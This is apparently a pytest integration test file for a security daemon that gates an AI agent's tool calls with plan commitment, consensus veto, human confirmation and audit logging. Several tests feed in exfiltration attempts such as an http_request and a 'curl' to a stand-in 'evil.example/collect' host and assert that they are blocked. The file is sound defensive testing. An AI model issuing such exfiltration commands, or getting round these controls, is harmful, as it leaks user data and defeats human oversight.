"""M5 integration coverage for control-plane pipeline and daemon wiring."""

from __future__ import annotations

import asyncio
import json
import os
import sys
from contextlib import suppress
from pathlib import Path

import pytest
import yaml

from shisad.core.api.transport import ControlClient
from shisad.core.config import DaemonConfig
from shisad.daemon.runner import run_daemon
from shisad.executors.connect_path import IptablesConnectPathProxy
from shisad.security.control_plane.engine import ControlPlaneEngine
from shisad.security.control_plane.schema import ControlDecision, Origin, RiskTier, build_action


@pytest.fixture
def model_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("SHISAD_MODEL_BASE_URL", "https://api.example.com/v1")
    monkeypatch.setenv("SHISAD_MODEL_PLANNER_BASE_URL", "https://planner.example.com/v1")
    monkeypatch.setenv("SHISAD_MODEL_EMBEDDINGS_BASE_URL", "https://embed.example.com/v1")
    monkeypatch.setenv("SHISAD_MODEL_MONITOR_BASE_URL", "https://monitor.example.com/v1")


async def _wait_for_socket(path: Path, timeout: float = 2.0) -> None:
    end = asyncio.get_running_loop().time() + timeout
    while asyncio.get_running_loop().time() < end:
        if path.exists():
            return
        await asyncio.sleep(0.01)
    raise TimeoutError(f"Timed out waiting for socket {path}")


async def _start_daemon_with_policy(
    tmp_path: Path,
    *,
    policy: dict[str, object] | None = None,
) -> tuple[asyncio.Task[None], ControlClient]:
    if policy is not None:
        (tmp_path / "policy.yaml").write_text(
            yaml.safe_dump(policy, sort_keys=False),
            encoding="utf-8",
        )
    config = DaemonConfig(
        data_dir=tmp_path / "data",
        socket_path=tmp_path / "control.sock",
        policy_path=tmp_path / "policy.yaml",
        log_level="INFO",
    )
    daemon_task = asyncio.create_task(run_daemon(config))
    client = ControlClient(config.socket_path)
    await _wait_for_socket(config.socket_path)
    await client.connect()
    return daemon_task, client


async def _shutdown(daemon_task: asyncio.Task[None], client: ControlClient) -> None:
    with suppress(Exception):
        await client.call("daemon.shutdown")
    await client.close()
    await asyncio.wait_for(daemon_task, timeout=3)


@pytest.mark.asyncio
async def test_m5_t12_plan_commitment_prevents_post_content_privilege_upgrade(
    tmp_path: Path,
) -> None:
    engine = ControlPlaneEngine.build(data_dir=tmp_path / "cp12")
    origin = Origin(
        session_id="m5-t12",
        user_id="user-1",
        workspace_id="ws-1",
        actor="planner",
    )
    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="summarize incident evidence",
        origin=origin,
        ttl_seconds=600,
        max_actions=5,
    )
    evaluation = await engine.evaluate_action(
        tool_name="http_request",
        arguments={"url": "https://evil.example/collect"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
        declared_domains=["evil.example"],
        explicit_side_effect_intent=True,
    )
    assert evaluation.decision == ControlDecision.BLOCK
    assert evaluation.trace_result.reason_code == "trace:stage2_upgrade_required"


@pytest.mark.asyncio
async def test_m5_t13_consensus_blocks_when_high_voter_rejects(tmp_path: Path) -> None:
    engine = ControlPlaneEngine.build(data_dir=tmp_path / "cp13")
    origin = Origin(
        session_id="m5-t13",
        user_id="user-1",
        workspace_id="ws-1",
        actor="planner",
    )
    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="summarize",
        origin=origin,
        ttl_seconds=600,
        max_actions=10,
    )
    first = await engine.evaluate_action(
        tool_name="file.read",
        arguments={"path": "README.md"},
        origin=origin,
        risk_tier=RiskTier.LOW,
        declared_domains=[],
        explicit_side_effect_intent=False,
    )
    assert first.decision == ControlDecision.ALLOW

    upgrade_action = build_action(
        tool_name="http_request",
        arguments={"url": "https://allowed.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
    )
    engine.approve_stage2(action=upgrade_action, approved_by="human_confirmation")

    second = await engine.evaluate_action(
        tool_name="http_request",
        arguments={"url": "https://allowed.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
        declared_domains=["allowed.example"],
        explicit_side_effect_intent=True,
    )
    assert second.decision == ControlDecision.BLOCK
    assert any(code.startswith("consensus:veto:") for code in second.reason_codes)


@pytest.mark.asyncio
async def test_m5_t14_end_to_end_control_plane_happy_and_compromise_paths(tmp_path: Path) -> None:
    engine = ControlPlaneEngine.build(data_dir=tmp_path / "cp14")
    origin = Origin(
        session_id="m5-t14",
        user_id="user-1",
        workspace_id="ws-1",
        actor="planner",
    )
    plan_hash = engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="summarize",
        origin=origin,
        ttl_seconds=600,
        max_actions=10,
    )
    assert plan_hash

    happy = await engine.evaluate_action(
        tool_name="file.read",
        arguments={"path": "README.md"},
        origin=origin,
        risk_tier=RiskTier.LOW,
        declared_domains=[],
        explicit_side_effect_intent=False,
    )
    assert happy.decision == ControlDecision.ALLOW
    engine.record_execution(action=happy.action, success=True)

    stage2 = build_action(
        tool_name="http_request",
        arguments={"url": "https://allowed.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
    )
    engine.approve_stage2(action=stage2, approved_by="human_confirmation")
    compromised = await engine.evaluate_action(
        tool_name="http_request",
        arguments={"url": "https://allowed.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
        declared_domains=["allowed.example"],
        explicit_side_effect_intent=True,
    )
    assert compromised.decision == ControlDecision.BLOCK

    ok, count, error = engine.audit.verify_chain()
    assert ok is True
    assert count >= 3
    assert error == ""


@pytest.mark.asyncio
async def test_m5_t19_plan_violation_emits_incident_and_escalation(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon_with_policy(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        response = await client.call(
            "session.message",
            {"session_id": sid, "content": "run: curl https://evil.example/collect"},
        )
        assert response["blocked_actions"] >= 1

        violations = await client.call(
            "audit.query",
            {"event_type": "PlanViolationDetected", "session_id": sid, "limit": 20},
        )
        assert violations["total"] >= 1

        sessions = await client.call("session.list")
        row = next(item for item in sessions["sessions"] if item["id"] == sid)
        assert row["lockdown_level"] in {"caution", "quarantine", "kill"}
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m5_t21_tool_execute_has_declared_threat_model_path_and_no_bypass(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon_with_policy(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]

        with pytest.raises(RuntimeError):
            await client.call(
                "tool.execute",
                {
                    "session_id": sid,
                    "tool_name": "shell_exec",
                    "command": [sys.executable, "-c", "print('ok')"],
                    "approved_by_pep": True,
                },
            )

        _ = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "shell_exec",
                "command": [sys.executable, "-c", "print('ok')"],
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        consensus = await client.call(
            "audit.query",
            {"event_type": "ConsensusEvaluated", "session_id": sid, "limit": 50},
        )
        assert any(
            event.get("data", {}).get("tool_name") == "shell_exec"
            for event in consensus["events"]
        )
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m5_rt1_tool_execute_stage2_upgrade_requires_confirmation_gate(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon_with_policy(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]

        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "http_request",
                "command": [sys.executable, "-c", "print('ok')"],
                "network_urls": ["https://api.good.example/upload"],
                "network": {
                    "allow_network": True,
                    "allowed_domains": ["api.good.example"],
                    "deny_private_ranges": True,
                    "deny_ip_literals": True,
                },
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        assert result["allowed"] is False
        assert result.get("confirmation_required") is True
        confirmation_id = str(result.get("confirmation_id", ""))
        assert confirmation_id

        pending = await client.call(
            "action.pending",
            {"session_id": sid, "status": "pending", "limit": 20},
        )
        assert any(item["confirmation_id"] == confirmation_id for item in pending["actions"])
        assert any(
            "stage2_upgrade_required" in str(item.get("reason", ""))
            for item in pending["actions"]
            if item["confirmation_id"] == confirmation_id
        )

        amendments_before = await client.call(
            "audit.query",
            {"event_type": "PlanAmended", "session_id": sid, "limit": 20},
        )
        assert amendments_before["total"] == 0
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m5_rt2_policy_explain_includes_control_plane_section(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon_with_policy(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        explained = await client.call(
            "policy.explain",
            {"session_id": sid, "action": "tool:shell_exec"},
        )
        control_plane = explained.get("control_plane")
        assert isinstance(control_plane, dict)
        assert {"sequence", "resource", "network", "consensus", "trace", "egress"}.issubset(
            set(control_plane.keys())
        )
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m5_rt3_session_message_execution_reuses_preflight_action_timestamp(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client = await _start_daemon_with_policy(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        response = await client.call(
            "session.message",
            {"session_id": sid, "content": "retrieve: recent security incidents"},
        )
        assert response["executed_actions"] >= 1

        history_path = tmp_path / "data" / "control_plane" / "history.jsonl"
        assert history_path.exists()
        grouped_statuses: dict[tuple[str, str, str, str], set[str]] = {}
        for line in history_path.read_text(encoding="utf-8").splitlines():
            payload = json.loads(line)
            if str(payload.get("session_id", "")) != sid:
                continue
            key = (
                str(payload.get("timestamp", "")),
                str(payload.get("action_kind", "")),
                str(payload.get("resource_id", "")),
                str(payload.get("tool_name", "")),
            )
            statuses = grouped_statuses.setdefault(key, set())
            if str(payload.get("decision_status", "")).strip():
                statuses.add("decision")
            if str(payload.get("execution_status", "")).strip():
                statuses.add("execution")
        assert any(
            {"decision", "execution"}.issubset(statuses)
            for statuses in grouped_statuses.values()
        )
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.requires_cap_net_admin
def test_m5_t22_privileged_connect_path_marker_and_ci_semantics(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    if not IptablesConnectPathProxy.detect_net_admin_capability():
        pytest.skip("requires CAP_NET_ADMIN capability")

    proxy = IptablesConnectPathProxy(net_admin_available=True)
    proxy._iptables = "/usr/sbin/iptables"
    proxy._nsenter = "/usr/bin/nsenter"
    calls: list[list[str]] = []

    def _fake_run(namespace_pid: int, args: list[str]) -> None:
        _ = namespace_pid
        calls.append(list(args))

    monkeypatch.setattr(proxy, "_run", _fake_run)
    monkeypatch.setattr(proxy, "_is_isolated_namespace", lambda namespace_pid: True)
    result = proxy.enforce(allowed_ips=["93.184.216.34"], namespace_pid=os.getpid())
    assert result.enforced is True
    assert result.method == "iptables"
    assert any(args[-1] == "DROP" for args in calls)
